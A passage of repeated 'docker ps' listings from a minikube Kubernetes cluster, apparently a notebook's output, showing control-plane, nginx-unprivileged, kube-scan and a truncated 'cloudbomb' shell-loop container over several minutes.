      "b3473922bbe4        5425bcbd23c5                  \"kube-controller-man…\"   6 hours ago         Up 6 hours                              k8s_kube-controller-manager_kube-controller-manager-minikube_kube-system_4787f37e041fd890d5499a8863561e5f_0\n",
      "fc75fd7aba15        004811815584                  \"etcd --advertise-cl…\"   6 hours ago         Up 6 hours                              k8s_etcd_etcd-minikube_kube-system_08a3871e1baa241b73e5af01a6d01393_0\n",
      "3cab011b2934        b51ddc1014b0                  \"kube-scheduler --au…\"   6 hours ago         Up 6 hours                              k8s_kube-scheduler_kube-scheduler-minikube_kube-system_97bca4cd66281ad2157a6a68956c4fa5_0\n",
      "c305e0932e5a        e64579b7d886                  \"kube-apiserver --ad…\"   6 hours ago         Up 6 hours                              k8s_kube-apiserver_kube-apiserver-minikube_kube-system_fe49842e48a1ca6bac988e8ba88ecc53_0\n",
      "fd8093a82c02        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_kube-scheduler-minikube_kube-system_97bca4cd66281ad2157a6a68956c4fa5_0\n",
      "b2787fd72074        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_kube-controller-manager-minikube_kube-system_4787f37e041fd890d5499a8863561e5f_0\n",
      "654ee9f65305        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_kube-apiserver-minikube_kube-system_fe49842e48a1ca6bac988e8ba88ecc53_0\n",
      "286180e64eaa        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_etcd-minikube_kube-system_08a3871e1baa241b73e5af01a6d01393_0\n",
      "CONTAINER ID        IMAGE                         COMMAND                  CREATED             STATUS              PORTS               NAMES\n",
      "9262dd397bc2        0fa6bb93d0d3                  \"/bin/sh -c 'while t…\"   40 seconds ago      Up 40 seconds                           k8s_cloudbomb_cloudbomb_default_91a424dd-9a79-47dc-a939-f0d80b6e23ac_0\n",
      "287b97245b66        k8s.gcr.io/pause:3.5          \"/pause\"                 40 seconds ago      Up 40 seconds                           k8s_POD_cloudbomb_default_91a424dd-9a79-47dc-a939-f0d80b6e23ac_0\n",
      "30e8fbea03ed        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   55 minutes ago      Up 55 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-lxc8w_default_a770a53d-4f08-4e4d-9ab8-9f90b21efe06_0\n",
      "e8f2365a91c4        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   55 minutes ago      Up 55 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-5gzxm_default_58a0653d-f423-413e-aa70-62c5f82b6b9d_0\n",
      "4cc66f2b2f06        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   55 minutes ago      Up 55 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-wwqhs_default_9d0404a6-c607-4c99-87f2-b1510678d51d_0\n",
      "a1bcbbaf5301        k8s.gcr.io/pause:3.5          \"/pause\"                 55 minutes ago      Up 55 minutes                           k8s_POD_nginx-strict-5cdc48cf55-5gzxm_default_58a0653d-f423-413e-aa70-62c5f82b6b9d_0\n",
      "591580bd91f1        k8s.gcr.io/pause:3.5          \"/pause\"                 55 minutes ago      Up 55 minutes                           k8s_POD_nginx-strict-5cdc48cf55-lxc8w_default_a770a53d-4f08-4e4d-9ab8-9f90b21efe06_0\n",
      "5712a32ddb12        k8s.gcr.io/pause:3.5          \"/pause\"                 55 minutes ago      Up 55 minutes                           k8s_POD_nginx-strict-5cdc48cf55-wwqhs_default_9d0404a6-c607-4c99-87f2-b1510678d51d_0\n",
      "612d18f433bd        6e38f40d628d                  \"/storage-provisioner\"   6 hours ago         Up 6 hours                              k8s_storage-provisioner_storage-provisioner_kube-system_b147672e-36fd-42d8-a691-2c3896f0f43b_0\n",
      "65793eecdde3        8d147537fb7d                  \"/coredns -conf /etc…\"   6 hours ago         Up 6 hours                              k8s_coredns_coredns-78fcd69978-jtj8x_kube-system_e01e0c8b-f513-4822-983a-264e8326eeb1_0\n",
      "f915b870ee6b        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_storage-provisioner_kube-system_b147672e-36fd-42d8-a691-2c3896f0f43b_0\n",
      "72c6ee947db8        873127efbc8a                  \"/usr/local/bin/kube…\"   6 hours ago         Up 6 hours                              k8s_kube-proxy_kube-proxy-7zcnf_kube-system_89a16e01-0d20-4a29-b0a6-61dd2b391017_0\n",
      "ed853a4bf5d0        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_coredns-78fcd69978-jtj8x_kube-system_e01e0c8b-f513-4822-983a-264e8326eeb1_0\n",
      "cfa9996f98c4        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_kube-proxy-7zcnf_kube-system_89a16e01-0d20-4a29-b0a6-61dd2b391017_0\n",
      "b3473922bbe4        5425bcbd23c5                  \"kube-controller-man…\"   6 hours ago         Up 6 hours                              k8s_kube-controller-manager_kube-controller-manager-minikube_kube-system_4787f37e041fd890d5499a8863561e5f_0\n",
      "fc75fd7aba15        004811815584                  \"etcd --advertise-cl…\"   6 hours ago         Up 6 hours                              k8s_etcd_etcd-minikube_kube-system_08a3871e1baa241b73e5af01a6d01393_0\n",
      "3cab011b2934        b51ddc1014b0                  \"kube-scheduler --au…\"   6 hours ago         Up 6 hours                              k8s_kube-scheduler_kube-scheduler-minikube_kube-system_97bca4cd66281ad2157a6a68956c4fa5_0\n",
      "c305e0932e5a        e64579b7d886                  \"kube-apiserver --ad…\"   6 hours ago         Up 6 hours                              k8s_kube-apiserver_kube-apiserver-minikube_kube-system_fe49842e48a1ca6bac988e8ba88ecc53_0\n",
      "fd8093a82c02        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_kube-scheduler-minikube_kube-system_97bca4cd66281ad2157a6a68956c4fa5_0\n",
      "b2787fd72074        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_kube-controller-manager-minikube_kube-system_4787f37e041fd890d5499a8863561e5f_0\n",
      "654ee9f65305        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_kube-apiserver-minikube_kube-system_fe49842e48a1ca6bac988e8ba88ecc53_0\n",
      "286180e64eaa        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_etcd-minikube_kube-system_08a3871e1baa241b73e5af01a6d01393_0\n",
      "CONTAINER ID        IMAGE                         COMMAND                  CREATED             STATUS              PORTS               NAMES\n",
      "9262dd397bc2        0fa6bb93d0d3                  \"/bin/sh -c 'while t…\"   50 seconds ago      Up 50 seconds                           k8s_cloudbomb_cloudbomb_default_91a424dd-9a79-47dc-a939-f0d80b6e23ac_0\n",
      "287b97245b66        k8s.gcr.io/pause:3.5          \"/pause\"                 50 seconds ago      Up 50 seconds                           k8s_POD_cloudbomb_default_91a424dd-9a79-47dc-a939-f0d80b6e23ac_0\n",
      "30e8fbea03ed        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   55 minutes ago      Up 55 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-lxc8w_default_a770a53d-4f08-4e4d-9ab8-9f90b21efe06_0\n",
      "e8f2365a91c4        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   55 minutes ago      Up 55 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-5gzxm_default_58a0653d-f423-413e-aa70-62c5f82b6b9d_0\n",
      "4cc66f2b2f06        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   55 minutes ago      Up 55 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-wwqhs_default_9d0404a6-c607-4c99-87f2-b1510678d51d_0\n",
      "a1bcbbaf5301        k8s.gcr.io/pause:3.5          \"/pause\"                 55 minutes ago      Up 55 minutes                           k8s_POD_nginx-strict-5cdc48cf55-5gzxm_default_58a0653d-f423-413e-aa70-62c5f82b6b9d_0\n",
      "591580bd91f1        k8s.gcr.io/pause:3.5          \"/pause\"                 55 minutes ago      Up 55 minutes                           k8s_POD_nginx-strict-5cdc48cf55-lxc8w_default_a770a53d-4f08-4e4d-9ab8-9f90b21efe06_0\n",
      "5712a32ddb12        k8s.gcr.io/pause:3.5          \"/pause\"                 55 minutes ago      Up 55 minutes                           k8s_POD_nginx-strict-5cdc48cf55-wwqhs_default_9d0404a6-c607-4c99-87f2-b1510678d51d_0\n",
      "612d18f433bd        6e38f40d628d                  \"/storage-provisioner\"   6 hours ago         Up 6 hours                              k8s_storage-provisioner_storage-provisioner_kube-system_b147672e-36fd-42d8-a691-2c3896f0f43b_0\n",
      "65793eecdde3        8d147537fb7d                  \"/coredns -conf /etc…\"   6 hours ago         Up 6 hours                              k8s_coredns_coredns-78fcd69978-jtj8x_kube-system_e01e0c8b-f513-4822-983a-264e8326eeb1_0\n",
      "f915b870ee6b        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_storage-provisioner_kube-system_b147672e-36fd-42d8-a691-2c3896f0f43b_0\n",
      "72c6ee947db8        873127efbc8a                  \"/usr/local/bin/kube…\"   6 hours ago         Up 6 hours                              k8s_kube-proxy_kube-proxy-7zcnf_kube-system_89a16e01-0d20-4a29-b0a6-61dd2b391017_0\n",
      "ed853a4bf5d0        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_coredns-78fcd69978-jtj8x_kube-system_e01e0c8b-f513-4822-983a-264e8326eeb1_0\n",
      "cfa9996f98c4        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_kube-proxy-7zcnf_kube-system_89a16e01-0d20-4a29-b0a6-61dd2b391017_0\n",
      "b3473922bbe4        5425bcbd23c5                  \"kube-controller-man…\"   6 hours ago         Up 6 hours                              k8s_kube-controller-manager_kube-controller-manager-minikube_kube-system_4787f37e041fd890d5499a8863561e5f_0\n",
      "fc75fd7aba15        004811815584                  \"etcd --advertise-cl…\"   6 hours ago         Up 6 hours                              k8s_etcd_etcd-minikube_kube-system_08a3871e1baa241b73e5af01a6d01393_0\n",
      "3cab011b2934        b51ddc1014b0                  \"kube-scheduler --au…\"   6 hours ago         Up 6 hours                              k8s_kube-scheduler_kube-scheduler-minikube_kube-system_97bca4cd66281ad2157a6a68956c4fa5_0\n",
      "c305e0932e5a        e64579b7d886                  \"kube-apiserver --ad…\"   6 hours ago         Up 6 hours                              k8s_kube-apiserver_kube-apiserver-minikube_kube-system_fe49842e48a1ca6bac988e8ba88ecc53_0\n",
      "fd8093a82c02        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_kube-scheduler-minikube_kube-system_97bca4cd66281ad2157a6a68956c4fa5_0\n",
      "b2787fd72074        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_kube-controller-manager-minikube_kube-system_4787f37e041fd890d5499a8863561e5f_0\n",
      "654ee9f65305        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_kube-apiserver-minikube_kube-system_fe49842e48a1ca6bac988e8ba88ecc53_0\n",
      "286180e64eaa        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago         Up 6 hours                              k8s_POD_etcd-minikube_kube-system_08a3871e1baa241b73e5af01a6d01393_0\n",
      "CONTAINER ID        IMAGE                         COMMAND                  CREATED              STATUS              PORTS               NAMES\n",
      "9262dd397bc2        0fa6bb93d0d3                  \"/bin/sh -c 'while t…\"   About a minute ago   Up About a minute                       k8s_cloudbomb_cloudbomb_default_91a424dd-9a79-47dc-a939-f0d80b6e23ac_0\n",
      "287b97245b66        k8s.gcr.io/pause:3.5          \"/pause\"                 About a minute ago   Up About a minute                       k8s_POD_cloudbomb_default_91a424dd-9a79-47dc-a939-f0d80b6e23ac_0\n",
      "30e8fbea03ed        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   55 minutes ago       Up 55 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-lxc8w_default_a770a53d-4f08-4e4d-9ab8-9f90b21efe06_0\n",
      "e8f2365a91c4        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   55 minutes ago       Up 55 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-5gzxm_default_58a0653d-f423-413e-aa70-62c5f82b6b9d_0\n",
      "4cc66f2b2f06        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   55 minutes ago       Up 55 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-wwqhs_default_9d0404a6-c607-4c99-87f2-b1510678d51d_0\n",
      "a1bcbbaf5301        k8s.gcr.io/pause:3.5          \"/pause\"                 55 minutes ago       Up 55 minutes                           k8s_POD_nginx-strict-5cdc48cf55-5gzxm_default_58a0653d-f423-413e-aa70-62c5f82b6b9d_0\n",
      "591580bd91f1        k8s.gcr.io/pause:3.5          \"/pause\"                 55 minutes ago       Up 55 minutes                           k8s_POD_nginx-strict-5cdc48cf55-lxc8w_default_a770a53d-4f08-4e4d-9ab8-9f90b21efe06_0\n",
      "5712a32ddb12        k8s.gcr.io/pause:3.5          \"/pause\"                 55 minutes ago       Up 55 minutes                           k8s_POD_nginx-strict-5cdc48cf55-wwqhs_default_9d0404a6-c607-4c99-87f2-b1510678d51d_0\n",
      "612d18f433bd        6e38f40d628d                  \"/storage-provisioner\"   6 hours ago          Up 6 hours                              k8s_storage-provisioner_storage-provisioner_kube-system_b147672e-36fd-42d8-a691-2c3896f0f43b_0\n",
      "65793eecdde3        8d147537fb7d                  \"/coredns -conf /etc…\"   6 hours ago          Up 6 hours                              k8s_coredns_coredns-78fcd69978-jtj8x_kube-system_e01e0c8b-f513-4822-983a-264e8326eeb1_0\n",
      "f915b870ee6b        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_storage-provisioner_kube-system_b147672e-36fd-42d8-a691-2c3896f0f43b_0\n",
      "72c6ee947db8        873127efbc8a                  \"/usr/local/bin/kube…\"   6 hours ago          Up 6 hours                              k8s_kube-proxy_kube-proxy-7zcnf_kube-system_89a16e01-0d20-4a29-b0a6-61dd2b391017_0\n",
      "ed853a4bf5d0        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_coredns-78fcd69978-jtj8x_kube-system_e01e0c8b-f513-4822-983a-264e8326eeb1_0\n",
      "cfa9996f98c4        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-proxy-7zcnf_kube-system_89a16e01-0d20-4a29-b0a6-61dd2b391017_0\n",
      "b3473922bbe4        5425bcbd23c5                  \"kube-controller-man…\"   6 hours ago          Up 6 hours                              k8s_kube-controller-manager_kube-controller-manager-minikube_kube-system_4787f37e041fd890d5499a8863561e5f_0\n",
      "fc75fd7aba15        004811815584                  \"etcd --advertise-cl…\"   6 hours ago          Up 6 hours                              k8s_etcd_etcd-minikube_kube-system_08a3871e1baa241b73e5af01a6d01393_0\n",
      "3cab011b2934        b51ddc1014b0                  \"kube-scheduler --au…\"   6 hours ago          Up 6 hours                              k8s_kube-scheduler_kube-scheduler-minikube_kube-system_97bca4cd66281ad2157a6a68956c4fa5_0\n",
      "c305e0932e5a        e64579b7d886                  \"kube-apiserver --ad…\"   6 hours ago          Up 6 hours                              k8s_kube-apiserver_kube-apiserver-minikube_kube-system_fe49842e48a1ca6bac988e8ba88ecc53_0\n",
      "fd8093a82c02        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-scheduler-minikube_kube-system_97bca4cd66281ad2157a6a68956c4fa5_0\n",
      "b2787fd72074        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-controller-manager-minikube_kube-system_4787f37e041fd890d5499a8863561e5f_0\n",
      "654ee9f65305        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-apiserver-minikube_kube-system_fe49842e48a1ca6bac988e8ba88ecc53_0\n",
      "286180e64eaa        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_etcd-minikube_kube-system_08a3871e1baa241b73e5af01a6d01393_0\n",
      "CONTAINER ID        IMAGE                         COMMAND                  CREATED              STATUS              PORTS               NAMES\n",
      "9262dd397bc2        0fa6bb93d0d3                  \"/bin/sh -c 'while t…\"   About a minute ago   Up About a minute                       k8s_cloudbomb_cloudbomb_default_91a424dd-9a79-47dc-a939-f0d80b6e23ac_0\n",
      "287b97245b66        k8s.gcr.io/pause:3.5          \"/pause\"                 About a minute ago   Up About a minute                       k8s_POD_cloudbomb_default_91a424dd-9a79-47dc-a939-f0d80b6e23ac_0\n",
      "30e8fbea03ed        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   55 minutes ago       Up 55 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-lxc8w_default_a770a53d-4f08-4e4d-9ab8-9f90b21efe06_0\n",
      "e8f2365a91c4        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   55 minutes ago       Up 55 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-5gzxm_default_58a0653d-f423-413e-aa70-62c5f82b6b9d_0\n",
      "4cc66f2b2f06        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   55 minutes ago       Up 55 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-wwqhs_default_9d0404a6-c607-4c99-87f2-b1510678d51d_0\n",
      "a1bcbbaf5301        k8s.gcr.io/pause:3.5          \"/pause\"                 55 minutes ago       Up 55 minutes                           k8s_POD_nginx-strict-5cdc48cf55-5gzxm_default_58a0653d-f423-413e-aa70-62c5f82b6b9d_0\n",
      "591580bd91f1        k8s.gcr.io/pause:3.5          \"/pause\"                 55 minutes ago       Up 55 minutes                           k8s_POD_nginx-strict-5cdc48cf55-lxc8w_default_a770a53d-4f08-4e4d-9ab8-9f90b21efe06_0\n",
      "5712a32ddb12        k8s.gcr.io/pause:3.5          \"/pause\"                 55 minutes ago       Up 55 minutes                           k8s_POD_nginx-strict-5cdc48cf55-wwqhs_default_9d0404a6-c607-4c99-87f2-b1510678d51d_0\n",
      "612d18f433bd        6e38f40d628d                  \"/storage-provisioner\"   6 hours ago          Up 6 hours                              k8s_storage-provisioner_storage-provisioner_kube-system_b147672e-36fd-42d8-a691-2c3896f0f43b_0\n",
      "65793eecdde3        8d147537fb7d                  \"/coredns -conf /etc…\"   6 hours ago          Up 6 hours                              k8s_coredns_coredns-78fcd69978-jtj8x_kube-system_e01e0c8b-f513-4822-983a-264e8326eeb1_0\n",
      "f915b870ee6b        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_storage-provisioner_kube-system_b147672e-36fd-42d8-a691-2c3896f0f43b_0\n",
      "72c6ee947db8        873127efbc8a                  \"/usr/local/bin/kube…\"   6 hours ago          Up 6 hours                              k8s_kube-proxy_kube-proxy-7zcnf_kube-system_89a16e01-0d20-4a29-b0a6-61dd2b391017_0\n",
      "ed853a4bf5d0        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_coredns-78fcd69978-jtj8x_kube-system_e01e0c8b-f513-4822-983a-264e8326eeb1_0\n",
      "cfa9996f98c4        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-proxy-7zcnf_kube-system_89a16e01-0d20-4a29-b0a6-61dd2b391017_0\n",
      "b3473922bbe4        5425bcbd23c5                  \"kube-controller-man…\"   6 hours ago          Up 6 hours                              k8s_kube-controller-manager_kube-controller-manager-minikube_kube-system_4787f37e041fd890d5499a8863561e5f_0\n",
      "fc75fd7aba15        004811815584                  \"etcd --advertise-cl…\"   6 hours ago          Up 6 hours                              k8s_etcd_etcd-minikube_kube-system_08a3871e1baa241b73e5af01a6d01393_0\n",
      "3cab011b2934        b51ddc1014b0                  \"kube-scheduler --au…\"   6 hours ago          Up 6 hours                              k8s_kube-scheduler_kube-scheduler-minikube_kube-system_97bca4cd66281ad2157a6a68956c4fa5_0\n",
      "c305e0932e5a        e64579b7d886                  \"kube-apiserver --ad…\"   6 hours ago          Up 6 hours                              k8s_kube-apiserver_kube-apiserver-minikube_kube-system_fe49842e48a1ca6bac988e8ba88ecc53_0\n",
      "fd8093a82c02        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-scheduler-minikube_kube-system_97bca4cd66281ad2157a6a68956c4fa5_0\n",
      "b2787fd72074        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-controller-manager-minikube_kube-system_4787f37e041fd890d5499a8863561e5f_0\n",
      "654ee9f65305        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-apiserver-minikube_kube-system_fe49842e48a1ca6bac988e8ba88ecc53_0\n",
      "286180e64eaa        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_etcd-minikube_kube-system_08a3871e1baa241b73e5af01a6d01393_0\n",
      "CONTAINER ID        IMAGE                         COMMAND                  CREATED              STATUS              PORTS               NAMES\n",
      "9262dd397bc2        0fa6bb93d0d3                  \"/bin/sh -c 'while t…\"   About a minute ago   Up About a minute                       k8s_cloudbomb_cloudbomb_default_91a424dd-9a79-47dc-a939-f0d80b6e23ac_0\n",
      "287b97245b66        k8s.gcr.io/pause:3.5          \"/pause\"                 About a minute ago   Up About a minute                       k8s_POD_cloudbomb_default_91a424dd-9a79-47dc-a939-f0d80b6e23ac_0\n",
      "30e8fbea03ed        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   55 minutes ago       Up 55 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-lxc8w_default_a770a53d-4f08-4e4d-9ab8-9f90b21efe06_0\n",
      "e8f2365a91c4        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   55 minutes ago       Up 55 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-5gzxm_default_58a0653d-f423-413e-aa70-62c5f82b6b9d_0\n",
      "4cc66f2b2f06        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   55 minutes ago       Up 55 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-wwqhs_default_9d0404a6-c607-4c99-87f2-b1510678d51d_0\n",
      "a1bcbbaf5301        k8s.gcr.io/pause:3.5          \"/pause\"                 56 minutes ago       Up 56 minutes                           k8s_POD_nginx-strict-5cdc48cf55-5gzxm_default_58a0653d-f423-413e-aa70-62c5f82b6b9d_0\n",
      "591580bd91f1        k8s.gcr.io/pause:3.5          \"/pause\"                 56 minutes ago       Up 56 minutes                           k8s_POD_nginx-strict-5cdc48cf55-lxc8w_default_a770a53d-4f08-4e4d-9ab8-9f90b21efe06_0\n",
      "5712a32ddb12        k8s.gcr.io/pause:3.5          \"/pause\"                 56 minutes ago       Up 56 minutes                           k8s_POD_nginx-strict-5cdc48cf55-wwqhs_default_9d0404a6-c607-4c99-87f2-b1510678d51d_0\n",
      "612d18f433bd        6e38f40d628d                  \"/storage-provisioner\"   6 hours ago          Up 6 hours                              k8s_storage-provisioner_storage-provisioner_kube-system_b147672e-36fd-42d8-a691-2c3896f0f43b_0\n",
      "65793eecdde3        8d147537fb7d                  \"/coredns -conf /etc…\"   6 hours ago          Up 6 hours                              k8s_coredns_coredns-78fcd69978-jtj8x_kube-system_e01e0c8b-f513-4822-983a-264e8326eeb1_0\n",
      "f915b870ee6b        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_storage-provisioner_kube-system_b147672e-36fd-42d8-a691-2c3896f0f43b_0\n",
      "72c6ee947db8        873127efbc8a                  \"/usr/local/bin/kube…\"   6 hours ago          Up 6 hours                              k8s_kube-proxy_kube-proxy-7zcnf_kube-system_89a16e01-0d20-4a29-b0a6-61dd2b391017_0\n",
      "ed853a4bf5d0        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_coredns-78fcd69978-jtj8x_kube-system_e01e0c8b-f513-4822-983a-264e8326eeb1_0\n",
      "cfa9996f98c4        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-proxy-7zcnf_kube-system_89a16e01-0d20-4a29-b0a6-61dd2b391017_0\n",
      "b3473922bbe4        5425bcbd23c5                  \"kube-controller-man…\"   6 hours ago          Up 6 hours                              k8s_kube-controller-manager_kube-controller-manager-minikube_kube-system_4787f37e041fd890d5499a8863561e5f_0\n",
      "fc75fd7aba15        004811815584                  \"etcd --advertise-cl…\"   6 hours ago          Up 6 hours                              k8s_etcd_etcd-minikube_kube-system_08a3871e1baa241b73e5af01a6d01393_0\n",
      "3cab011b2934        b51ddc1014b0                  \"kube-scheduler --au…\"   6 hours ago          Up 6 hours                              k8s_kube-scheduler_kube-scheduler-minikube_kube-system_97bca4cd66281ad2157a6a68956c4fa5_0\n",
      "c305e0932e5a        e64579b7d886                  \"kube-apiserver --ad…\"   6 hours ago          Up 6 hours                              k8s_kube-apiserver_kube-apiserver-minikube_kube-system_fe49842e48a1ca6bac988e8ba88ecc53_0\n",
      "fd8093a82c02        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-scheduler-minikube_kube-system_97bca4cd66281ad2157a6a68956c4fa5_0\n",
      "b2787fd72074        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-controller-manager-minikube_kube-system_4787f37e041fd890d5499a8863561e5f_0\n",
      "654ee9f65305        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-apiserver-minikube_kube-system_fe49842e48a1ca6bac988e8ba88ecc53_0\n",
      "286180e64eaa        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_etcd-minikube_kube-system_08a3871e1baa241b73e5af01a6d01393_0\n",
      "CONTAINER ID        IMAGE                         COMMAND                  CREATED              STATUS              PORTS               NAMES\n",
      "24071c9d6ae1        k8s.gcr.io/pause:3.5          \"/pause\"                 2 seconds ago        Up 1 second                             k8s_POD_kube-scan-db6ffdfd5-qdt94_kube-scan_0f0a7470-c89c-405a-a6f6-9775db49a20a_0\n",
      "9262dd397bc2        0fa6bb93d0d3                  \"/bin/sh -c 'while t…\"   About a minute ago   Up About a minute                       k8s_cloudbomb_cloudbomb_default_91a424dd-9a79-47dc-a939-f0d80b6e23ac_0\n",
      "287b97245b66        k8s.gcr.io/pause:3.5          \"/pause\"                 About a minute ago   Up About a minute                       k8s_POD_cloudbomb_default_91a424dd-9a79-47dc-a939-f0d80b6e23ac_0\n",
      "30e8fbea03ed        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   55 minutes ago       Up 55 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-lxc8w_default_a770a53d-4f08-4e4d-9ab8-9f90b21efe06_0\n",
      "e8f2365a91c4        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   56 minutes ago       Up 55 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-5gzxm_default_58a0653d-f423-413e-aa70-62c5f82b6b9d_0\n",
      "4cc66f2b2f06        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   56 minutes ago       Up 56 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-wwqhs_default_9d0404a6-c607-4c99-87f2-b1510678d51d_0\n",
      "a1bcbbaf5301        k8s.gcr.io/pause:3.5          \"/pause\"                 56 minutes ago       Up 56 minutes                           k8s_POD_nginx-strict-5cdc48cf55-5gzxm_default_58a0653d-f423-413e-aa70-62c5f82b6b9d_0\n",
      "591580bd91f1        k8s.gcr.io/pause:3.5          \"/pause\"                 56 minutes ago       Up 56 minutes                           k8s_POD_nginx-strict-5cdc48cf55-lxc8w_default_a770a53d-4f08-4e4d-9ab8-9f90b21efe06_0\n",
      "5712a32ddb12        k8s.gcr.io/pause:3.5          \"/pause\"                 56 minutes ago       Up 56 minutes                           k8s_POD_nginx-strict-5cdc48cf55-wwqhs_default_9d0404a6-c607-4c99-87f2-b1510678d51d_0\n",
      "612d18f433bd        6e38f40d628d                  \"/storage-provisioner\"   6 hours ago          Up 6 hours                              k8s_storage-provisioner_storage-provisioner_kube-system_b147672e-36fd-42d8-a691-2c3896f0f43b_0\n",
      "65793eecdde3        8d147537fb7d                  \"/coredns -conf /etc…\"   6 hours ago          Up 6 hours                              k8s_coredns_coredns-78fcd69978-jtj8x_kube-system_e01e0c8b-f513-4822-983a-264e8326eeb1_0\n",
      "f915b870ee6b        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_storage-provisioner_kube-system_b147672e-36fd-42d8-a691-2c3896f0f43b_0\n",
      "72c6ee947db8        873127efbc8a                  \"/usr/local/bin/kube…\"   6 hours ago          Up 6 hours                              k8s_kube-proxy_kube-proxy-7zcnf_kube-system_89a16e01-0d20-4a29-b0a6-61dd2b391017_0\n",
      "ed853a4bf5d0        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_coredns-78fcd69978-jtj8x_kube-system_e01e0c8b-f513-4822-983a-264e8326eeb1_0\n",
